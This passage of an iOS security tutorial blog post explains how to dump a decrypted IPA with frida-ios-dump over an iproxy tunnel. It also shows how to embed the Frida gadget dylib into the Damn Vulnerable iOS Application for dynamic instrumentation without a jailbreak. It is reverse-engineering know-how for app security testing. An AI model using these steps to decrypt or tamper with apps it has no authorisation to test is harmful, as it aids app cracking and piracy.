Frida for dynamic instrumentation on a non-jailbroken device.</p>

<p>To dump an IPA, we will use an open source tool known as frida-ios-dump which can be found on https://github.com/AloneMonkey/frida-ios-dump.</p>

<p>The first thing is to set up port forwarding. This can be done by using iproxy. By default frida-ios-dump will connect from local port 2222 to remote port 22. So this is what we will set up with iproxy as well.</p>

<!--more-->

<p><img src="/images/posts/ios51/1.png" alt="1" /></p>

<p>Next, clone the repo from github.</p>

<p><img src="/images/posts/ios51/2.png" alt="2" /></p>

<p>Now navigate under the tool directory, open the file dump.py and and change the user/pass to that of your device. This will allow frida-ios-dump to connect to your device over the tunnel you just created. All of this is assuming your device is connected to the computer over USB. If its over Wifi (SSH), then the public key for the device must be added to the target device’s ~/.ssh/authorized_keys file.</p>

<p><img src="/images/posts/ios51/3.png" alt="3" /></p>

<p>Now you can use the command <em>python dump.py AppName</em> to dump the IPA file from the device.</p>

<p><img src="/images/posts/ios51/4.png" alt="4" /></p>

<p>The next thing we need to learn is to do dynamic instrumentation on a non jailbroken device. This requires us to have the source code of the application or a decrypted IPA. In this article, we will only discuss the scenario where source code is required. The way it works is that we include a dylib in the application source code. This dylib needs to be obviously signed before being deployed into the device. Since the device is not jailbroken in this case, you need to sign it with your official Apple developer certificate (and not a self signed certificate). In this case, we will be inserting the dylib into Damn Vulnerable iOS application. You can clone DVIA from <a href="https://github.com/prateek147/DVIA-v2.git">here</a>.</p>

<p>You can grab the latest release of the Frida gadget from the Frida releases page. Look for the iOS gadget. At the time of writing this article, the latest Frida version is 12.0.4 and could be downloaded from <a href="https://github.com/frida/frida/releases/download/12.0.4/frida-gadget-12.0.4-ios-universal.dylib.xz">here</a>. Once it is downloaded, run the following commands.</p>

<p><img src="/images/posts/ios51/5.png" alt="5" /></p>

<p>Rename this dylib file to FridaGadget.dylib. Create a directory named Frameworks and put this dylib inside there. Now open the Xcode project for the application for which you want to perform the instrumentation. Drag and drop the folder on the very top level of the directory structure (similar to App Delegate) and make sure the following options are selected.</p>

<p><img src="/images/posts/ios51/6.png" alt="6" /> <img src="/images/posts/ios51/7.png" alt="7" /></p>

<p>Under Project navigator, go to the <em>Build Phases</em> section and under the <em>Link Binary with Libraries</em>, drag and drop the FridaGadget.dylib file from the Frameworks folder. Also, make sure the <em>Copy Bundle Resources</em> section contains the Frameworks folder.</p>

<p><img src="/images/posts/ios51/8.png" alt="8" /></p>

<p>In my case, i also had to disable the setting ENABLE Bitcode by going to Build Settings and disabling it. Since we are running the app locally this shoudn’t really matter.</p>

<p><img src="/images/posts/ios51/9.png" alt="9" /></p>

<p>Now we are all set, run the app and you should a log like this in the console.</p>

<p><img src="/images/posts/ios51/10.png" alt="10" /></p>

<p>Running the command <em>frida -Uai</em> will now show this app in the output. You can now trace the application via the normal frida commands.</p>

<p><img src="/images/posts/ios51/11.png" alt="11" /></p>

<p>Since we attached to the application in the image above, the application finished launching. This can be done for late instrumentation. In order to attach to the application during launch for early instrumentation, you need to spawn it. This can be done with the -f option in frida which is used for spawning.</p>

<p><img src="/images/posts/ios51/12.png" alt="12" /> <img src="/images/posts/ios51/13.png" alt="13" /> <img src="/images/posts/ios51/14.png" alt="14" /></p>

<p>One last thing, you can also attach to the application in the iOS simulator by using the -R command.</p>

<p><img src="/images/posts/ios51/15.png" alt="15" /> <strong>References</strong></p>

<ol>
  <li>https://frida.re/docs/ios/#without-jailbreak</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><summary type="html"><![CDATA[In this article, we will look at how to dump decrypted IPA file for an application using frida and then look at how to set up Frida for dynamic instrumentation on a non-jailbroken device.]]></summary></entry></feed>